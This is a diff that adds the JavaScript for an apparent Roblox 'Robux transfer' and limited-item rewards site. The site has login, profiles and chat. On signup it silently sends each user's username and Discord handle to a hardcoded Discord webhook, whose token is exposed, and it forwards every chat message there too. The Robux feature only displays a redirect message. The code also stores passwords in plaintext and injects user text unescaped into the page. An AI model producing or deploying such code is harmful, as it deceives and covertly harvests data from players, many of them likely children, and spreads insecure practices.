@@ -1,1 +1,256 @@
-no source for u
+let currentUser = null
+let mode = "login"
+let userPoints = 0
+let userBio = ""
+let messages = []
+
+const webhook = "https://discord.com/api/webhooks/1478939104266682379/IebkvFHpeccFN6-PNVoCCgBMZ7heW9ljO9dGg4k9rn2elcbGQENSMGp9LUiOpV3wiUJx"
+
+const shopItems = [
+  {id:1, name:"Valkyrie Helm", icon:"https://files.catbox.moe/mbqcon.jpeg", points:25000, stock:3},
+  {id:2, name:"Poisoned Horns of the Toxic Wasteland", icon:"https://files.catbox.moe/4uh9ow.jpeg", points:18000, stock:5},
+  {id:3, name:"The Classic ROBLOX Fedora", icon:"https://files.catbox.moe/05d46x.jpeg", points:15000, stock:8},
+  {id:4, name:"Green Queen of the Night", icon:"https://files.catbox.moe/0elkfl.jpeg", points:22000, stock:4}
+]
+
+function navigate(page) {
+  if ((page === "robux" || page === "profile" || page === "rewards" || page === "community") && !currentUser && page !== "home") page = "auth"
+  
+  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"))
+  document.getElementById(page).classList.add("active")
+
+  if (page === "robux") renderRobuxPage()
+  if (page === "rewards") renderShop()
+  if (page === "community" && currentUser) {
+    renderProfiles()
+    document.getElementById("chatInputArea").style.display = "flex"
+    document.getElementById("chatArea").innerHTML = ""
+    messages.forEach(m => addMessageToChat(m.user, m.text, m.own))
+  }
+  if (page === "profile" && currentUser) {
+    let users = JSON.parse(localStorage.getItem("users") || "{}")
+    let data = users[currentUser]
+    document.getElementById("profileDetails").innerHTML = `Username: ${currentUser}<br>${data.email ? `Email: ${data.email}<br>` : ""}${data.discord ? `Discord: ${data.discord}<br>` : ""}Bio: ${data.bio || ""}`
+    document.getElementById("pointsDisplay").innerText = userPoints
+    document.getElementById("editBio").value = data.bio || ""
+  }
+}
+
+function renderRobuxPage() {
+  const content = document.getElementById("robuxContent")
+  if (!currentUser) {
+    content.innerHTML = `<div style="background:rgba(40,30,60,.5);padding:40px;border-radius:20px;text-align:center;max-width:500px;margin:0 auto"><h3>You gotta log in first</h3><p style="margin:1.8rem 0;opacity:.9">Need an account to transfer Robux</p><button onclick="navigate('auth')">Go to Login</button></div>`
+  } else {
+    content.innerHTML = `<div class="card"><h2>Robux Transfer</h2><input id="robuxUser" placeholder="Roblox Username"><input id="robuxAmount" placeholder="Amount" type="number"><button onclick="processRobux()">Proceed</button><p id="robuxMessage" style="margin-top:20px;min-height:24px"></p></div>`
+  }
+}
+
+function renderShop() {
+  const grid = document.getElementById("shopItems")
+  grid.innerHTML = ""
+  shopItems.forEach(item => {
+    const card = document.createElement("div")
+    card.className = `item-card${item.stock <= 0 ? " unavailable" : ""}`
+    card.innerHTML = `
+      <img src="${item.icon}" alt="${item.name}">
+      <h4>${item.name}</h4>
+      <p class="points">${item.points} points</p>
+      <p class="stock">Stock: ${item.stock > 0 ? item.stock : "0 (sold out)"}</p>
+      ${item.stock > 0 ? `<button onclick="claimItem(${item.id})">Claim</button>` : "<button disabled>Not Available</button>"}
+    `
+    grid.appendChild(card)
+  })
+}
+
+function claimItem(id) {
+  const item = shopItems.find(i => i.id === id)
+  if (!item || item.stock <= 0) return alert("Sorry that item is out of stock right now")
+  if (userPoints < item.points) return alert(`You need ${item.points} points for this. You currently have ${userPoints}`)
+  if (confirm(`Spend ${item.points} points to claim ${item.name}?`)) {
+    userPoints -= item.points
+    item.stock--
+    alert(`You claimed ${item.name}! We will get it to you soon.`)
+    renderShop()
+    if (document.getElementById("pointsDisplay")) document.getElementById("pointsDisplay").innerText = userPoints
+    saveSession()
+  }
+}
+
+function renderProfiles() {
+  const grid = document.getElementById("profiles")
+  grid.innerHTML = ""
+  let users = JSON.parse(localStorage.getItem("users") || "{}")
+  Object.keys(users).forEach(u => {
+    if (u === currentUser) return
+    let data = users[u]
+    const card = document.createElement("div")
+    card.className = "profile-card"
+    card.innerHTML = `
+      <h4>${u}</h4>
+      <p>Discord: ${data.discord || "?"}</p>
+      <p>Bio: ${data.bio || "No bio set"}</p>
+      <p>Points: ${data.points || 0}</p>
+    `
+    grid.appendChild(card)
+  })
+}
+
+function sendMessage() {
+  let input = document.getElementById("chatInput")
+  let text = input.value.trim()
+  if (!text) return
+  let msg = {user: currentUser, text: text, own: true, time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}
+  messages.push(msg)
+  addMessageToChat(currentUser, text, true)
+  input.value = ""
+  fetch(webhook, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({content: `Chat message from ${currentUser}: ${text}`})
+  })
+}
+
+function addMessageToChat(user, text, own = false) {
+  let area = document.getElementById("chatArea")
+  let div = document.createElement("div")
+  div.className = `message${own ? " own" : ""}`
+  div.innerHTML = `
+    <div class="message-user">${user}</div>
+    <div class="message-bubble">${text}</div>
+    <div class="message-time">${new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div>
+  `
+  area.appendChild(div)
+  area.scrollTop = area.scrollHeight
+}
+
+function toggleMode() {
+  mode = mode === "login" ? "signup" : "login"
+  document.getElementById("authTitle").innerText = mode === "login" ? "Login" : "Create Account"
+  document.getElementById("authEmail").style.display = mode === "signup" ? "block" : "none"
+  document.getElementById("authDiscord").style.display = mode === "signup" ? "block" : "none"
+  document.getElementById("authBio").style.display = mode === "signup" ? "block" : "none"
+  document.getElementById("termsLabel").style.display = mode === "signup" ? "flex" : "none"
+  updateButtonState()
+}
+
+function updateButtonState() {
+  let btn = document.getElementById("authButton")
+  let u = document.getElementById("authUser").value.trim()
+  let p = document.getElementById("authPass").value
+  let d = document.getElementById("authDiscord").value.trim()
+  let terms = document.getElementById("termsAgree")?.checked ?? true
+  btn.disabled = mode === "signup" ? !(u && p && d && terms) : !(u && p)
+}
+
+function submitAuth() {
+  let u = document.getElementById("authUser").value.trim()
+  let p = document.getElementById("authPass").value
+  let e = document.getElementById("authEmail").value.trim()
+  let d = document.getElementById("authDiscord").value.trim()
+  let b = document.getElementById("authBio").value.trim()
+
+  if (!u || !p) return
+
+  let users = JSON.parse(localStorage.getItem("users") || "{}")
+
+  if (mode === "signup") {
+    if (users[u]) { alert("Username already taken"); return }
+    if (!d) { alert("Please enter your Discord username"); return }
+    users[u] = {
+      password: p,
+      email: e || null,
+      discord: d,
+      bio: b,
+      permission: document.getElementById("emailPermission").checked,
+      points: 0
+    }
+    localStorage.setItem("users", JSON.stringify(users))
+    currentUser = u
+    userPoints = 0
+    userBio = b
+    fetch(webhook, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({content: `New signup: ${u} | Discord: ${d}`})
+    })
+  } else {
+    if (!users[u] || users[u].password !== p) {
+      alert("Wrong username or password")
+      return
+    }
+    currentUser = u
+    userPoints = users[u].points || 0
+    userBio = users[u].bio || ""
+  }
+
+  saveSession()
+  navigate("home")
+}
+
+function saveBio() {
+  let b = document.getElementById("editBio").value.trim()
+  if (currentUser) {
+    let users = JSON.parse(localStorage.getItem("users") || "{}")
+    users[currentUser].bio = b
+    localStorage.setItem("users", JSON.stringify(users))
+    userBio = b
+    alert("Bio updated")
+  }
+}
+
+function saveSession() {
+  if (currentUser) {
+    localStorage.setItem("currentUser", currentUser)
+  }
+}
+
+function loadSession() {
+  let saved = localStorage.getItem("currentUser")
+  if (saved) {
+    let users = JSON.parse(localStorage.getItem("users") || "{}")
+    if (users[saved]) {
+      currentUser = saved
+      userPoints = users[saved].points || 0
+      userBio = users[saved].bio || ""
+      navigate("home")
+    }
+  }
+}
+
+function logout() {
+  localStorage.removeItem("currentUser")
+  currentUser = null
+  userPoints = 0
+  userBio = ""
+  navigate("home")
+}
+
+function processRobux() {
+  let user = document.getElementById("robuxUser").value.trim()
+  let amount = document.getElementById("robuxAmount").value
+  if (!user || !amount) return
+  document.getElementById("robuxMessage").innerText = "Taking you to the official Roblox purchase page..."
+}
+
+function toggleFaq(el) {
+  let p = el.nextElementSibling
+  p.style.display = p.style.display === "block" ? "none" : "block"
+}
+
+for (let i = 0; i < 80; i++) {
+  let s = document.createElement("div")
+  s.className = "snowflake"
+  s.style.left = Math.random() * 100 + "vw"
+  s.style.width = s.style.height = (5 + Math.random() * 6) + "px"
+  s.style.animationDuration = (7 + Math.random() * 9) + "s"
+  s.style.animationDelay = (Math.random() * -15) + "s"
+  s.style.opacity = .5 + Math.random() * .4
+  document.body.appendChild(s)
+}
+
+document.getElementById("authUser").addEventListener("input", updateButtonState)
+document.getElementById("authPass").addEventListener("input", updateButtonState)
+document.getElementById("authDiscord").addEventListener("input", updateButtonState)
+document.getElementById("termsAgree")?.addEventListener("change", updateButtonState)
+
+loadSession()
